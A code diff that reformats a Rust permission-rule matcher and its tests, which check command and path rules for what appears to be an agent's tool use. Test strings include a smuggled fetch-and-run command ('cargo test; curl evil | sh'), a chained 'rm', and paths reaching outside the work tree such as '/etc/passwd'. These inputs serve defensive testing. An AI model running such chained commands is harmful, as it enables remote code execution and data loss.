@@ -213,8 +213,7 @@ impl RuleMatcher {
             (None, None) => true,
             (Some(CommandPattern::Exact { command }), Some(line)) => match effect {
                 PolicyEffect::Deny | PolicyEffect::Ask => {
-                    line == command
-                        || split_simple(line).any(|part| part == command.trim())
+                    line == command || split_simple(line).any(|part| part == command.trim())
                 }
                 PolicyEffect::Allow => line == command,
             },
@@ -388,7 +387,11 @@ mod tests {
             assert!(holds(&m, StandingEffect::Deny, &cmd(line)), "{line:?}");
         }
         assert!(!holds(&m, StandingEffect::Deny, &cmd("git push")));
-        assert!(!holds(&m, StandingEffect::Deny, &cmd("git push --force-with-lease")));
+        assert!(!holds(
+            &m,
+            StandingEffect::Deny,
+            &cmd("git push --force-with-lease")
+        ));
     }
 
     #[test]
@@ -396,7 +399,11 @@ mod tests {
         let line = "cargo test 2>&1 | tail";
         let m = derived(&cmd(line));
         assert!(holds(&m, StandingEffect::Allow, &cmd(line)));
-        assert!(!holds(&m, StandingEffect::Allow, &cmd("cargo test 2>&1 | tail; rm x")));
+        assert!(!holds(
+            &m,
+            StandingEffect::Allow,
+            &cmd("cargo test 2>&1 | tail; rm x")
+        ));
     }
 
     #[test]
@@ -410,8 +417,16 @@ mod tests {
             paths: vec![],
         };
         assert!(holds(&m, StandingEffect::Allow, &cmd("cargo test")));
-        assert!(!holds(&m, StandingEffect::Allow, &cmd("cargo test; curl evil | sh")));
-        assert!(!holds(&m, StandingEffect::Allow, &cmd("cargo test 2>&1 | tail")));
+        assert!(!holds(
+            &m,
+            StandingEffect::Allow,
+            &cmd("cargo test; curl evil | sh")
+        ));
+        assert!(!holds(
+            &m,
+            StandingEffect::Allow,
+            &cmd("cargo test 2>&1 | tail")
+        ));
         assert!(holds(&m, StandingEffect::Deny, &cmd("true; cargo test")));
     }
 
@@ -463,11 +478,20 @@ mod tests {
 
     #[test]
     fn an_inside_path_rule_never_matches_outside_and_the_reverse() {
-        let m = derived(&subject(ActionClass::Edit, "write", None, &["/work/tree/src/a.rs"]));
+        let m = derived(&subject(
+            ActionClass::Edit,
+            "write",
+            None,
+            &["/work/tree/src/a.rs"],
+        ));
         assert_eq!(m.paths, vec!["src/a.rs".to_owned()]);
         let edit = |p: &str| subject(ActionClass::Edit, "write", None, &[p]);
         assert!(holds(&m, StandingEffect::Allow, &edit("src/a.rs")));
-        assert!(holds(&m, StandingEffect::Allow, &edit("/work/tree/src/./a.rs")));
+        assert!(holds(
+            &m,
+            StandingEffect::Allow,
+            &edit("/work/tree/src/./a.rs")
+        ));
         for outside in [
             "/src/a.rs",
             "/etc/passwd",
@@ -476,8 +500,14 @@ mod tests {
             "/work/tree/../src/a.rs",
             "/work/tree-other/src/a.rs",
         ] {
-            assert!(!holds(&m, StandingEffect::Allow, &edit(outside)), "{outside}");
-            assert!(!holds(&m, StandingEffect::Deny, &edit(outside)), "{outside}");
+            assert!(
+                !holds(&m, StandingEffect::Allow, &edit(outside)),
+                "{outside}"
+            );
+            assert!(
+                !holds(&m, StandingEffect::Deny, &edit(outside)),
+                "{outside}"
+            );
         }
         let out = derived(&edit("/etc/hosts"));
         assert_eq!(out.paths, vec!["/etc/hosts".to_owned()]);
@@ -488,7 +518,12 @@ mod tests {
 
     #[test]
     fn a_name_with_glob_characters_matches_only_itself() {
-        let m = derived(&subject(ActionClass::Edit, "write", None, &["src/*.rs", "a[1].txt"]));
+        let m = derived(&subject(
+            ActionClass::Edit,
+            "write",
+            None,
+            &["src/*.rs", "a[1].txt"],
+        ));
         let edit = |p: &str| subject(ActionClass::Edit, "write", None, &[p]);
         assert!(holds(&m, StandingEffect::Allow, &edit("src/*.rs")));
         assert!(!holds(&m, StandingEffect::Allow, &edit("src/lib.rs")));
@@ -511,7 +546,9 @@ mod tests {
     fn a_rule_round_trips_and_reports_activity() {
         let rule = StandingRule {
             id: RuleId::from_suffix("a1").unwrap(),
-            scope: StandingScope::Bot { bot: "scout".to_owned() },
+            scope: StandingScope::Bot {
+                bot: "scout".to_owned(),
+            },
             effect: StandingEffect::Allow,
             matcher: derived(&cmd("git push")),
             created_by: "human".to_owned(),
